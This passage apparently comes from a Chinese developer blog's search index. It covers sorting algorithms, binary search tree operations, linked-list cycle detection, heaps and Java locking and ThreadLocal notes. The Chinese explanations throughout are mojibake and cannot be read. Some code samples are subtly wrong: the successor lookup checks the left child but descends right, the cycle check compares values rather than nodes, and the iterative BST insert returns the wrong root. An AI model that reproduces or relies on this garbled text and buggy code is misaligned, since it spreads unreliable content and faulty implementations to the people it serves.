{10,34,2,56,7,67,88,42}; int[] arr2 = doSelectionSort(arr1); for(int i:arr2){ System.out.print(i); System.out.print(&quot;, &quot;); } } } æ³¨æ„ï¼Œæ¯æ¬¡éå†éƒ½éƒ½ä¼šæ„å‘³ç€æ•°ç»„åˆ†ä¸ºæœ‰åºå’Œæ— åºä¸¤éƒ¨åˆ†ï¼Œéå†æ˜¯ä»æ— åºçš„æ•°ç»„ç¬¬ä¸€ä¸ªå¼€å§‹çš„ï¼Œå¹¶ä¸”å°†æ— åºæ•°ç»„ä¸­çš„æœ€å°å€¼ä¸æ— åºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ swapä¸€ä¸‹ã€‚å°±æ˜¯å¾ˆç›´è§‚çš„æ¯æ¬¡æŠŠæœ€å°çš„æ‹¿åˆ°æœ€å·¦è¾¹çš„åšæ³•ã€‚ 1.6 Quicksortä¸€ç§æ¯”è¾ƒå¿«é€Ÿçš„æ’åºæ–¹æ³•è§†é¢‘é€‰ä¸­æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œç§°ä¹‹ä¸ºpivotã€‚ç„¶åä»å·¦åˆ°å³æ‰¾ï¼ŒæŠŠæ‰€æœ‰å°äºpivotçš„å…ƒç´ æŒªåˆ°å·¦è¾¹ã€‚ç„¶åæŠŠpivotæŒªåˆ°åˆšæ‰é‚£ä¸ªå…ƒç´ å³è¾¹ï¼Œä¸€ç›´é‡å¤ä¸‹å»ã€‚ public static void quickSort(int[] data,int low,int high) { if (low &lt; high) { int povit = partition(data, low, high); quickSort(data, low, povit - 1); quickSort(data, povit + 1, high); } } public static int partition(int[] arr,int low , int high){ int pivot = arr[low]; while (low &lt; high) { while (low&lt;high&amp;&amp;arr[high]&gt;=pivot) { --high; } arr[low] = arr[high]; while (low&lt;high&amp;&amp;arr[low]&lt;=pivot) { ++low; } arr[high] = arr[low]; } arr[low] = pivot; return low; } è¿™æ˜¯å¥½ä¸å®¹æ˜“çœ‹æ‡‚çš„å¿«é€Ÿæ’åºjavaå®ç°ï¼Œæ„Ÿå—ä¸‹æ‰‹å†™å¿«æ’ å¦ä¸€ç§ä½¿ç”¨é€’å½’çš„æ–¹å¼ public static void main(String[] args) { int[] array = {1, 4, 2, 45, 6, 4, 2, 4, 7, 10, 24, 12, 14, 17, 10, 9, 4}; QuickSort(array, 0, array.length-1); Utils.printEach(array); } private static void QuickSort(int[] arr, int start, int end) { if (start &lt; end) { int key = arr[start]; int i = start, j; for (j = start+1;j&lt;=end;j++) { if (arr[j] &lt; key) { Utils.swap(arr, j, i + 1); i++; } } arr[start] = arr[i]; arr[i] = key; QuickSort(arr, start, i - 1); QuickSort(arr, i+1, end); } } 1.7 TimSortjavaçš„Collections.sortçš„ç®—æ³•ï¼ŒComparison Method Violates Its General Contract!) 2. äºŒå‰æ ‘2.1 äºŒå‰æŸ¥æ‰¾æ ‘(BST)å®šä¹‰:åœ¨äºŒå‰æŸ¥æ‰¾æ ‘ä¸­ï¼š(01) è‹¥ä»»æ„èŠ‚ç‚¹çš„å·¦å­æ ‘ä¸ç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼›(02) ä»»æ„èŠ‚ç‚¹çš„å³å­æ ‘ä¸ç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼›(03) ä»»æ„èŠ‚ç‚¹çš„å·¦ã€å³å­æ ‘ä¹Ÿåˆ†åˆ«ä¸ºäºŒå‰æŸ¥æ‰¾æ ‘ã€‚(04) æ²¡æœ‰é”®å€¼ç›¸ç­‰çš„èŠ‚ç‚¹ï¼ˆno duplicate nodesï¼‰ã€‚ äºŒå‰æŸ¥æ‰¾æ ‘çš„å¢åˆ æ”¹æŸ¥ æ±‚BSTçš„æœ€å°å€¼//æ±‚BSTçš„æœ€å°å€¼ public TreeNode getMin(TreeNode root) { if(root==null) return null; while(root.left!=null) root=root.left; return root; } æ±‚BSTçš„æœ€å¤§å€¼ //æ±‚BSTçš„æœ€å¤§å€¼ public TreeNode getMax(TreeNode root) { if(root==null) return null; while(root.right!=null) root=root.right; return root; } æŸ¥æ‰¾BSTä¸­æŸèŠ‚ç‚¹çš„å‰é©±èŠ‚ç‚¹.å³æŸ¥æ‰¾æ•°æ®å€¼å°äºè¯¥ç»“ç‚¹çš„æœ€å¤§ç»“ç‚¹ã€‚public TreeNode preNode(TreeNode x) { if(x==null) return null; // å¦‚æœxå­˜åœ¨å·¦å­©å­ï¼Œåˆ™&quot;xçš„å‰é©±ç»“ç‚¹&quot;ä¸º &quot;ä»¥å…¶å·¦å­©å­ä¸ºæ ¹çš„å­æ ‘çš„æœ€å¤§ç»“ç‚¹&quot;ã€‚ if(x.left!=null) return getMax(x.left);//ç›´æ¥æ‰¾å·¦æ ‘çš„æœ€å¤§èŠ‚ç‚¹å°±å¥½äº†ï¼Œå°±æ˜¯ä¸€ç›´å¾€å·¦æ‰¾ // å¦‚æœxæ²¡æœ‰å·¦å­©å­ã€‚åˆ™xæœ‰ä»¥ä¸‹ä¸¤ç§å¯èƒ½ï¼š // (01) xæ˜¯&quot;ä¸€ä¸ªå³å­©å­&quot;ï¼Œåˆ™&quot;xçš„å‰é©±ç»“ç‚¹&quot;ä¸º &quot;å®ƒçš„çˆ¶ç»“ç‚¹&quot;ã€‚ // (02) xæ˜¯&quot;ä¸€ä¸ªå·¦å­©å­&quot;ï¼Œåˆ™ å‰é©±èŠ‚ç‚¹ä¸ºxçš„æŸä¸€ä¸ªç¥–å…ˆèŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ï¼Œè€Œä¸”è¯¥ç¥–å…ˆèŠ‚ç‚¹æ˜¯ä½œä¸ºå…¶çˆ¶èŠ‚ç‚¹çš„å³å„¿å­ TreeNode p=x.parent; while(p!=null&amp;&amp;p.left==x) { x=p;//çˆ¶èŠ‚ç‚¹ç½®ä¸ºæ–°çš„x p=p.parent; //çˆ¶èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ç½®ä¸ºæ–°çš„çˆ¶èŠ‚ç‚¹ } return p; } æŸ¥æ‰¾BSTä¸­æŸèŠ‚ç‚¹çš„åç»§èŠ‚ç‚¹.å³æŸ¥æ‰¾æ•°æ®å€¼å¤§äºè¯¥ç»“ç‚¹çš„æœ€å°ç»“ç‚¹ã€‚public TreeNode postNode(TreeNode x) { if(x==null) return null; // å¦‚æœxå­˜åœ¨å³å­©å­ï¼Œåˆ™&quot;xçš„åç»§ç»“ç‚¹&quot;ä¸º &quot;ä»¥å…¶å³å­©å­ä¸ºæ ¹çš„å­æ ‘çš„æœ€å°ç»“ç‚¹&quot;ã€‚ if(x.left!=null) return getMin(x.right); // å¦‚æœxæ²¡æœ‰å³å­©å­ã€‚åˆ™xæœ‰ä»¥ä¸‹ä¸¤ç§å¯èƒ½ï¼š // (01) xæ˜¯&quot;ä¸€ä¸ªå·¦å­©å­&quot;ï¼Œåˆ™&quot;xçš„åç»§ç»“ç‚¹&quot;ä¸º &quot;å®ƒçš„çˆ¶ç»“ç‚¹&quot;ã€‚ // (02) xæ˜¯&quot;ä¸€ä¸ªå³å­©å­&quot;ï¼Œåˆ™ å‰é©±èŠ‚ç‚¹ä¸ºxçš„æŸä¸€ä¸ªç¥–å…ˆèŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ï¼Œè€Œä¸”è¯¥ç¥–å…ˆèŠ‚ç‚¹æ˜¯ä½œä¸ºå…¶çˆ¶èŠ‚ç‚¹çš„å·¦å„¿å­ TreeNode p=x.parent; while(p!=null&amp;&amp;p.right==x) { x=p;//çˆ¶èŠ‚ç‚¹ç½®ä¸ºæ–°çš„x p=p.parent; //çˆ¶èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ç½®ä¸ºæ–°çš„çˆ¶èŠ‚ç‚¹ } return p; } ç»™å‡ºä¸€ä¸ªIntå€¼ï¼ŒæŸ¥æ‰¾è¿™ä¸ªIntå€¼åœ¨æ ‘ä¸­å¯¹åº”çš„èŠ‚ç‚¹//é€’å½’ public TreeNode findNode(TreeNode head, int val){ if(head==null){ return null; } if(head.val==val){ return head; }else if(head.val &gt; val){ head = head.left; }else { head= head.right; } return findNode(head, val); } //éé€’å½’ public TreeNode findNode(TreeNode head, int val){ if(head==null){ return null; } while(head!=null){ if(head.val ==val){ return head; }else if (head.val &gt; val){ head = head.left; }else { head = head.right; } } return head; } æ’å…¥å€¼//BSTæ’å…¥èŠ‚ç‚¹ --é€’å½’ç‰ˆ-- public TreeNode insertRec(TreeNode root,TreeNode x) { if(root==null) root=x; else if(x.value&lt;root.value) root.left=insertRec(root.left, x); else if(x.value&gt;root.value) root.right=insertRec(root.right, x); return root; } //BSTæ’å…¥èŠ‚ç‚¹ --é é€’å½’ç‰ˆ-- public TreeNode insert(TreeNode root,TreeNode x) { if(root==null) root=x; TreeNode p=null;//éœ€è¦è®°å½•çˆ¶èŠ‚ç‚¹ while(root!=null)//å®šä½æ’å…¥çš„ä½ç½® { p=root;//è®°å½•çˆ¶èŠ‚ç‚¹ if(x.value&lt;root.value) root=root.left; else root=root.right; } x.parent=p;//å®šä½åˆ°åˆé€‚çš„é¡µèŠ‚ç‚¹çš„ç©ºç™½å¤„åï¼Œæ ¹æ®å’Œçˆ¶èŠ‚ç‚¹çš„å¤§å°æ¯”è¾ƒæ’å…¥åˆé€‚çš„ä½ç½® if(x.value&lt;p.value) p.left=x; else if(x.value&gt;p.value) p.right=x; return root; } å‚è€ƒJavaå…³äºæ•°æ®ç»“æ„çš„å®ç°ï¼šæ ‘ 3. é“¾è¡¨æœ‰ç¯é“¾è¡¨çš„åˆ¤æ–­é—®é¢˜ã€‚æ—¶é—´å¤æ‚åº¦å’Œç©ºé—´å¤æ‚åº¦çš„æœ€ä¼˜è§£æ˜¯åˆ›å»ºä¸¤æ ¹è¿­ä»£é€Ÿåº¦ä¸ä¸€æ ·çš„æŒ‡é’ˆ ä¸‹é¢çš„ä»£ç æ¥è‡ªcsdn public class LinkLoop { public static boolean hasLoop(Node n){ //å®šä¹‰ä¸¤ä¸ªæŒ‡é’ˆtmp1,tmp2 Node tmp1 = n; Node tmp2 = n.next; while(tmp2!=null){ int d1 = tmp1.val; int d2 = tmp2.val; if(d1 == d2)return true;//å½“ä¸¤ä¸ªæŒ‡é’ˆé‡é€¢æ—¶ï¼Œè¯´æ˜å­˜åœ¨ç¯ï¼Œå¦åˆ™ä¸å­˜åœ¨ã€‚ tmp1 = tmp1.next; //æ¯æ¬¡è¿­ä»£æ—¶ï¼ŒæŒ‡é’ˆ1èµ°ä¸€æ­¥ï¼ŒæŒ‡é’ˆ2èµ°ä¸¤æ­¥ tmp2 = tmp2.next.next; if(tmp2 == null)return false;//ä¸å­˜åœ¨ç¯æ—¶ï¼Œé€€å‡º } return true; //å¦‚æœtmp2ä¸ºnullï¼Œè¯´æ˜å…ƒç´ åªæœ‰ä¸€ä¸ªï¼Œä¹Ÿå¯ä»¥è¯´æ˜æ˜¯å­˜åœ¨ç¯ } //æ–¹æ³•2ï¼šå°†æ¯æ¬¡èµ°è¿‡çš„èŠ‚ç‚¹ä¿å­˜åˆ°hashè¡¨ä¸­ï¼Œå¦‚æœèŠ‚ç‚¹åœ¨hashè¡¨ä¸­ï¼Œåˆ™è¡¨ç¤ºå­˜åœ¨ç¯ public static boolean hasLoop2(Node n){ Node temp1 = n; HashMap&lt;Node,Node&gt; ns = new HashMap&lt;Node,Node&gt;(); while(n!=null){ if(ns.get(temp1)!=null)return true; else ns.put(temp1, temp1); temp1 = temp1.next; if(temp1 == null)return false; } return true; } public static void main(String[] args) { Node n1 = new Node(1); Node n2 = new Node(2); Node n3 = new Node(3); Node n4 = new Node(4); Node n5 = new Node(5); n1.next = n2; n2.next = n3; n3.next = n4; n4.next = n5; n5.next = n1; //æ„é€ ä¸€ä¸ªå¸¦ç¯çš„é“¾è¡¨,å»é™¤æ­¤å¥è¡¨ç¤ºä¸å¸¦ç¯ System.out.println(hasLoop(n1)); System.out.println(hasLoop2(n1)); } } ç»™å®šä¸¤å•é“¾è¡¨Aã€Bï¼Œåªç»™å‡ºä¸¤å¤´æŒ‡é’ˆã€‚è¯·é—®ï¼š 1ã€å¦‚ä½•åˆ¤æ–­ä¸¤å•é“¾è¡¨ï¼ˆæ— ç¯ï¼‰æ˜¯å¦ç›¸äº¤ï¼Ÿ æœ‰ä¸¤ç§å¯å–çš„åŠæ³•ï¼š ï¼ˆ1ï¼‰äººä¸ºæ„ç¯ï¼Œå°†é“¾è¡¨Açš„å°¾èŠ‚ç‚¹æŒ‡å‘é“¾è¡¨Bï¼Œå†åˆ¤æ–­æ˜¯å¦æ„ç¯æˆåŠŸï¼Ÿä»é“¾è¡¨Bçš„å¤´æŒ‡é’ˆå¾€ä¸‹éå†ï¼Œå¦‚æœèƒ½å¤Ÿå›åˆ°Bï¼Œåˆ™è¯´æ˜ç›¸äº¤ ï¼ˆ2ï¼‰åˆ¤æ–­ä¸¤é“¾è¡¨æœ€åä¸€ä¸ªèŠ‚ç‚¹æ˜¯å¦ç›¸åŒï¼Œå¦‚æœç›¸äº¤ï¼Œåˆ™å°¾èŠ‚ç‚¹è‚¯å®šæ˜¯åŒä¸€èŠ‚ç‚¹ 2ã€å¦‚ä½•åˆ¤æ–­ä¸¤å•é“¾è¡¨ï¼ˆä¸çŸ¥æ˜¯å¦æœ‰ç¯ï¼‰ç›¸äº¤ï¼Ÿ å…ˆåˆ¤æ–­æ˜¯å¦æœ‰ç¯ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰ç¯å¯ä»¥ä½¿ç”¨è¿½é€åŠæ³•ï¼Œè®¾ç½®ä¸¤ä¸ªæŒ‡é’ˆï¼Œä¸€ä¸ªèµ°ä¸€æ­¥ï¼Œä¸€ä¸ªèµ°ä¸¤æ­¥ï¼Œå¦‚æœèƒ½ç›¸é‡åˆ™è¯´æ˜å­˜åœ¨ç¯ ï¼ˆ1ï¼‰ä¸¤ä¸ªéƒ½æ²¡ç¯ï¼šå›åˆ°é—®é¢˜1 ï¼ˆ2ï¼‰ä¸€ä¸ªæœ‰ç¯ï¼Œä¸€ä¸ªæ²¡ç¯ï¼šä¸ç”¨åˆ¤æ–­äº†ï¼Œè‚¯å®šä¸¤é“¾è¡¨ä¸ç›¸äº¤ ï¼ˆ3ï¼‰ä¸¤ä¸ªéƒ½æœ‰ç¯ï¼šåˆ¤æ–­é“¾è¡¨Açš„ç¢°æ’ç‚¹æ˜¯å¦å‡ºç°åœ¨é“¾è¡¨Bçš„ç¯ä¸­ï¼Œå¦‚æœåœ¨ï¼Œåˆ™ç›¸äº¤ã€‚ï¼ˆç›¸äº¤æ—¶ï¼Œç¯å¿…å®šæ˜¯ä¸¤é“¾è¡¨å…±æœ‰çš„ï¼‰ 3.æœ€å°æ ˆçš„å®ç°éœ€è¦ä¸¤ä¸ªæ ˆï¼ŒAå’ŒBï¼ŒBç”¨äºå­˜å‚¨Aä¸­å½“å‰minçš„indexï¼ŒBä¸­ç”±ä¸Šè€Œä¸‹ä¾æ¬¡æ˜¯Açš„æœ€å°ï¼Œç¬¬äºŒå°ï¼Œç¬¬ä¸‰å°ã€‚ã€‚ã€‚æ‰€ä»¥ä¸‡ä¸€Aä¸­çš„æœ€å°è¢«popæ‰äº†ï¼Œç›´æ¥æ‹¿Bé¡¶ä¸Šçš„å…ƒç´ ï¼Œå§‹ç»ˆæ˜¯æœ€å°çš„ã€‚æ—¶é—´å¤æ‚åº¦æ˜¯O(1)ï¼Œç©ºé—´å¤æ‚åº¦æœ€åæ˜¯O(N) 4.åœ¨O(1)æ—¶é—´å¤æ‚åº¦åˆ é™¤é“¾è¡¨èŠ‚ç‚¹ class Solution: # @param node: the node in the list should be deleted # @return: nothing def deleteNode(self, node): temp = node.next node.val = temp.val node.next = temp.next # write your code here å †æ’åºçš„å®ç°å †æ’åºï¼Œæ—¶é—´å¤æ‚åº¦O(nlogn),ä»»ä½•æ—¶åˆ»éƒ½åªéœ€è¦å¸¸æ•°ä¸ªé¢å¤–çš„å…ƒç´ ç©ºé—´å­˜å‚¨ä¸´æ—¶æ•°æ®ã€‚å †çš„å®šä¹‰ nä¸ªå…ƒç´ çš„åºåˆ—{k1ï¼Œk2ï¼Œâ€¦,kn}å½“ä¸”ä»…å½“æ»¡è¶³ä¸‹åˆ—å…³ç³»ä¹‹ä¸€æ—¶ï¼Œç§°ä¹‹ä¸ºå †ã€‚ æƒ…å½¢1ï¼ški &lt;= k2i ä¸”ki &lt;= k2i+1 ï¼ˆæœ€å°åŒ–å †æˆ–å°é¡¶å †ï¼‰ æƒ…å½¢2ï¼ški &gt;= k2i ä¸”ki &gt;= k2i+1 ï¼ˆæœ€å¤§åŒ–å †æˆ–å¤§é¡¶å †ï¼‰ å…¶ä¸­i=1,2,â€¦,n/2å‘ä¸‹å–æ•´;å †å¯ä»¥çœ‹æˆæ˜¯å®Œå…¨äºŒå‰æ ‘ï¼Œå®Œå…¨äºŒå‰æ ‘ä¸­æ‰€æœ‰éç»ˆç«¯ç»“ç‚¹çš„å€¼å‡ä¸å¤§äºï¼ˆæˆ–ä¸å°äºï¼‰å…¶å·¦ã€å³å­©å­ç»“ç‚¹çš„å€¼ã€‚æ’åºé€šå¸¸ç”¨æœ€å¤§å †ï¼Œæ„é€ ä¼˜å…ˆé˜Ÿåˆ—é€šå¸¸ç”¨æœ€å°å †ã€‚æœ€å¤§å †(å¤§é¡¶å †)å’Œæœ€å°å †å®ç°åŸºæœ¬ä¸€æ ·ï¼Œåªè¦ä¿®æ”¹ç»´æŠ¤å †æ€§è´¨çš„å‡½æ•°å³å¯ã€‚Javaå®ç°â€”å †æ’åº Heap Sort å †æ’åºæ–¹æ³•å¯¹è®°å½•æ•°è¾ƒå°‘çš„æ–‡ä»¶å¹¶ä¸å€¼å¾—æå€¡ï¼Œä½†å¯¹nè¾ƒå¤§çš„æ–‡ä»¶è¿˜æ˜¯å¾ˆæœ‰æ•ˆçš„ã€‚å› ä¸ºå…¶è¿è¡Œæ—¶é—´ä¸»è¦è€—è´¹åœ¨å»ºåˆå§‹å †å’Œè°ƒæ•´å»ºæ–°å †æ—¶è¿›è¡Œçš„åå¤â€œç­›é€‰â€ä¸Šã€‚ ä»»æ„ä¸€ä½ç½®iä¸Šå…ƒç´ ï¼Œå…¶å·¦å„¿å­ä¸º2i+1ä¸Šï¼Œå³å„¿å­åœ¨2i+2ä¸Šã€‚ æˆ‘ç¢°åˆ°è¿‡çš„ç®—æ³•é¢˜(è¿˜æ˜¯é¢è¯•å®˜æ‰‹ä¸‹ç•™æƒ…çš„)ï¼š ä¸¤ä¸ªæ•´å½¢æ•°ç»„ï¼Œè¯·ä½¿ç”¨ä½ èƒ½å¤Ÿæƒ³åˆ°çš„æœ€ä¼˜ç®—æ³•ï¼Œå®ç°æ±‚äº¤é›†çš„æ“ä½œ äºŒç»´æ•°ç»„ç¯å½¢æ‰“å° ç»™å®šä¸€ä¸ªn*mçŸ©é˜µï¼Œæ±‚ä»å·¦ä¸Šè§’åˆ°å³ä¸‹è§’æ€»å…±å­˜åœ¨å¤šå°‘æ¡è·¯å¾„ï¼Œæ¯æ¬¡åªèƒ½å‘å³èµ°æˆ–è€…å‘ä¸‹èµ°ã€‚é€’å½’å’ŒåŠ¨æ€è§„åˆ’ é¦–å…ˆç»™å‡ºè®¡ç®—æ€»çš„å¯èƒ½è·¯å¾„çš„æ–¹æ³• public static int uniquePaths(int m, int n){ if(m==0 || n==0) return 0; if(m ==1 || n==1) return 1; int[][] dp = new int[m][n]; //åªæœ‰ä¸€è¡Œæ—¶ï¼Œåˆ°ç»ˆç‚¹æ¯ä¸ªæ ¼å­åªæœ‰ä¸€ç§èµ°æ³• for (int i=0; i&lt;n; i++) dp[0][i] = 1; // åªæœ‰ä¸€åˆ—æ—¶ï¼Œåˆ°ç»ˆç‚¹æ¯ä¸ªæ ¼å­åªæœ‰ä¸€ç§èµ°æ³• for (int i=0; i&lt;m; i++) dp[i][0] = 1; // for each body node, number of path = paths from top + paths from left for (int i=1; i&lt;m; i++){ for (int j=1; j&lt;n; j++){ dp[i][j] = dp[i-1][j] + dp[i][j-1]; } } return dp[m-1][n-1]; } è§£æ³•äºŒï¼šæ•°å­¦ä¸­çš„ç»„åˆé—®é¢˜ï¼Œå› ä¸ºä»å·¦ä¸Šè§’åˆ°å³ä¸‹è§’ï¼Œæ€»å…±éœ€è¦èµ°n+m-2æ­¥ï¼Œå·¦ä¸Šè§’å’Œå³ä¸‹è§’çš„å…ƒç´ ä¸è€ƒè™‘åœ¨å†…ï¼Œæˆ‘ä»¬æ¯æ¬¡éƒ½å¯ä»¥é€‰æ‹©å‘ä¸‹èµ°ï¼Œå‘ä¸‹èµ°æ€»å…±éœ€è¦m-1æ­¥ï¼Œæ‰€ä»¥åœ¨n+m-2æ­¥ä¸­é€‰æ‹©m-1æ­¥ï¼Œè¿™æ˜¯å…¸å‹çš„æ’åˆ—ç»„åˆé—®é¢˜ã€‚ int uniquePaths(int m, int n) { int N = n + m - 2; int K = n - 1; double res = 1.0; for (int i = 1; i &lt;= n - 1; ++i) { res = res * (N - K + i) / i; } return (int)res; } KMPç®—æ³•","tags":[{"name":"ç®—æ³•","slug":"ç®—æ³•","permalink":"https://haldir65.github.io/tags/ç®—æ³•/"}]},{"title":"javaå¤šçº¿ç¨‹ä¸­éœ€è¦æ³¨æ„çš„ä¸€äº›ç‚¹","date":"2017-08-03T21:04:28.000Z","path":"2017/08/03/2017-08-03-high-concurrency-recipes/","text":"The difference between â€œconcurrentâ€ and â€œparallelâ€ executionGood to knowæ„é€ å‡½æ•°ä¹Ÿä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„(å› ä¸ºæŒ‡ä»¤é‡æ’) 1. å¯é‡å…¥é”çš„æ¦‚å¿µå¯é‡å…¥é”ï¼Œä¹Ÿå«åšé€’å½’é”ï¼ŒæŒ‡çš„æ˜¯åŒä¸€çº¿ç¨‹ å¤–å±‚å‡½æ•°è·å¾—é”ä¹‹å ï¼Œå†…å±‚é€’å½’å‡½æ•°ä»ç„¶æœ‰è·å–è¯¥é”çš„ä»£ç ï¼Œä½†ä¸å—å½±å“ã€‚ A ReentrantLock is owned by the thread last successfully locking, but not yet unlocking it. A thread invoking lock will return, successfully acquiring the lock, when the lock is not owned by another thread. The method will return immediately if the current thread already owns the lock. ä¹Ÿå°±æ˜¯è¯´å¦‚æœå½“å‰å ç”¨é”çš„äººå°±æ˜¯å½“å‰çº¿ç¨‹ï¼Œé‚£ä¹ˆå†æ¬¡è°ƒç”¨lockæ–¹æ³•å°†ç›´æ¥è¿”å›ã€‚ æ¯”æ–¹è¯´ lock.lock() â€” lock.lock() â€” lock.unlock()lock.unlock() ReentrantLockå’Œsynchronizedéƒ½æ˜¯å¯é‡å…¥é” @Override public void run() { final ReentrantLock lock = this.lock; lock.lock(); //æ‹¿ä¸åˆ°lockçš„Threadä¼šæŒ‚èµ· try { this.mList.add(&quot;new elements added by&quot; + mIndex + &quot;&quot;); //å¯¹å…±äº«èµ„æºçš„æ“ä½œæ”¾è¿™é‡Œ } finally { lock.unlock(); //è®°å¾—è§£é” } } éå¯é‡å…¥é”çš„ä¾‹å­ //ä¸€ç§éå¯é‡å…¥é” class Lock{ private boolean isLocked = false; public synchronized void lock() throws InterruptedException{ while(isLocked){ wait(); } isLocked = true; } public synchronized void unlock(){ isLocked = false; notify(); } } public class TestLock { private Lock lock = new Lock(); // private Lock lock = new ReentrantLock(); public void t1() throws Exception{ lock.lock(); System.out.println(&quot;t1æ‰§è¡Œäº†&quot;); t2(); lock.unlock(); } public void t2() throws Exception{ lock.lock(); System.out.println(&quot;t2ä¹Ÿæ‰§è¡Œäº†&quot;); lock.unlock(); } public static void main(String[] args) throws Exception{ new TestLock().t1(); } } è¾“å‡º: t1æ‰§è¡Œäº† ç¨‹åºä¸€ç›´åœ¨è·‘ï¼Œå› ä¸ºwaitä½äº† ReentrantLockçš„æ„é€ å‡½æ•°å¯ä»¥ä¼ ä¸€ä¸ªbooleanè¿›å»ï¼Œè¡¨ç¤ºå…¬å¹³é”è¿˜æ˜¯éå…¬å¹³é”ï¼Œé»˜è®¤æ˜¯éå…¬å¹³é”ã€‚åœ¨è·å–é”çš„æ—¶å€™ï¼Œéå…¬å¹³é”æ˜¯æ–°åˆ°çš„çº¿ç¨‹å’Œç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹ä¸€èµ·ç«äº‰é”ï¼Œä½†å…¬å¹³é”åˆ™å§‹ç»ˆä¿è¯ç­‰å¾…æœ€é•¿çš„çº¿ç¨‹è·å–é”ã€‚ 2. ThreadLocalæ¯”è¾ƒå¥½çš„ç”¨ä¾‹åœ¨Andriodçš„Looperä¸­Looper.prepare() private static void prepare(boolean quitAllowed) { if (sThreadLocal.get() != null) { throw new RuntimeException(&quot;Only one Looper may be created per thread&quot;); } sThreadLocal.set(new Looper(quitAllowed));//sThreadLocalæ˜¯staticçš„ï¼Œæ³¨æ„leak } // ThreadLocal public void set(T value) { Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); //ThreadLocalMapå°±æ˜¯ä¸€ä¸ªEntryä¸ºWeakReferenceï¼ˆWeakRWeakReferenceä¸æ˜¯æœ‰getæ–¹æ³•å˜›ï¼Œä¹Ÿæ˜¯key-valueçš„å½¢å¼ï¼‰ã€‚ä¸Šé¢è¿”å›å½“å‰Threadçš„æˆå‘˜å˜é‡ã€‚ï¼ˆæ‰€ä»¥è¯´Threadåˆ›å»ºä¹Ÿæ˜¯å¾ˆè€—è´¹å†…å­˜çš„å˜›ï¼‰ if (map != null) map.set(this, value);//æ³¨æ„è¿™ä¸ªthisæ˜¯sThreadLocalï¼Œstaticçš„ else createMap(t, value); } ä¸€ä¸ªæ¯”è¾ƒå¥½çš„å…³äºThreadlLocalä¸ºä»€ä¹ˆå®¹æ˜“leakçš„è§£é‡Šï¼ŒThreadLocalæ˜¯ä½œä¸ºThreadLocalMapä¸­çš„Entryçš„keyå­˜åœ¨çš„ï¼Œä¹Ÿå°±æ˜¯Thread-&gt; ThreadLocalMap -&gt; Entry -&gt; WeakReference of ThreadLocal ã€‚æƒ³æƒ³ä¸€ä¸‹ï¼Œå‡å¦‚å¤–éƒ¨è°ƒç”¨è€…é‡Šæ”¾äº†ThreadLocalçš„å¼•ç”¨ï¼Œè¿™ä¸ªEntryä¸­çš„keyå°±æˆä¸ºnulläº†ï¼Œä½†æ˜¯è¿™ä¸ªEntryä¸­çš„Valueè¿˜åœ¨ï¼Œä¸€ç›´è¢«ThreadæŒæœ‰ç€ã€‚æ‰€ä»¥è¿™äº‹è¿˜æ˜¯åœ¨äºThreadçš„ç”Ÿå‘½å‘¨æœŸå¯èƒ½å¾ˆé•¿ã€‚fixçš„æ–¹æ¡ˆï¼š å¤–éƒ¨ç¡®å®šä¸ç”¨çš„æ—¶å€™è®°å¾—è°ƒç”¨ä¸‹removeå°±å¥½äº†ã€‚ æ‰€ä»¥é¿å…leakçš„è¯ï¼Œè®°å¾—è°ƒç”¨ThreadLocal.removeæ¯ä¸€æ¡çº¿ç¨‹è°ƒç”¨ThreadLocalçš„setæ–¹æ³•æ—¶éƒ½åªèƒ½æ”¹å˜å±äºè‡ªå·±ï¼ˆçº¿ç¨‹ï¼‰çš„å€¼ï¼Œè°ƒç”¨getçš„æ—¶å€™ä¹Ÿåªèƒ½è¯»åˆ°è‡ªå·±æ›¾ç»è®¾ç½®çš„å€¼ã€‚åœ¨å¤šæ¡çº¿ç¨‹é¢å‰ï¼Œä¸€ä¸ªThreadLocalæœ¬èº«å¹¶ä¸æ˜¯å®¹å™¨ï¼Œå› ä¸ºæ•°æ®å®é™…ä¸Šæ”¾åœ¨äº†Threadçš„ä¸€ä¸ªmapé‡Œé¢ï¼Œæ¯æ¡çº¿ç¨‹åªèƒ½ä¿å­˜æˆ–è€…æ›´æ”¹è¯»å–è‡ªå·±çš„ä¿é™©æŸœé‡Œçš„ä¸œè¥¿ï¼Œä¿é™©æŸœé’¥åŒ™å³ThreadLocalè‡ªèº«ã€‚ 3. Fork/join since java 7æœ‰äº›ä»»åŠ¡æ˜¯å¯ä»¥åˆ†å—çš„ã€‚work-stealingçš„å®ç° 4. ArrayBlockingQueue Thread Safeæ„é€ å‡½æ•°é‡Œé¢å°±åŠ äº†é”ï¼Œæ˜¯ä¸ºäº†é¿å…æŒ‡ä»¤é‡æ’ï¼Œä¿è¯å¯è§æ€§ArrayBlockingQueueçš„æ„é€ å‡½æ•°åŠ é”é—®é¢˜æ˜¯ä½“ç°æŒ‡ä»¤é‡æ’çš„ä¸€ä¸ªéå¸¸å¥½çš„ä¾‹å­ï¼šArrayBlockingQueue /** Main lock guarding all access */ final ReentrantLock lock; /** Condition for waiting takes */ private final Condition notEmpty; /** Condition for waiting puts */ private final Condition notFull; public ArrayBlockingQueue(int capacity) { this(capacity, false); } public ArrayBlockingQueue(int capacity, boolean fair) { if (capacity &lt;= 0) throw new IllegalArgumentException(); this.items = new Object[capacity]; lock = new ReentrantLock(fair); // notEmpty = lock.newCondition(); // notFull = lock.newCondition(); // //è¿™äº›æˆå‘˜å˜é‡éƒ½æ˜¯finalçš„ } public ArrayBlockingQueue(int capacity, boolean fair, Collection&lt;? extends E&gt; c) { this(capacity, fair); final ReentrantLock lock = this.lock; lock.lock(); // Lock only for visibility, not mutual exclusion 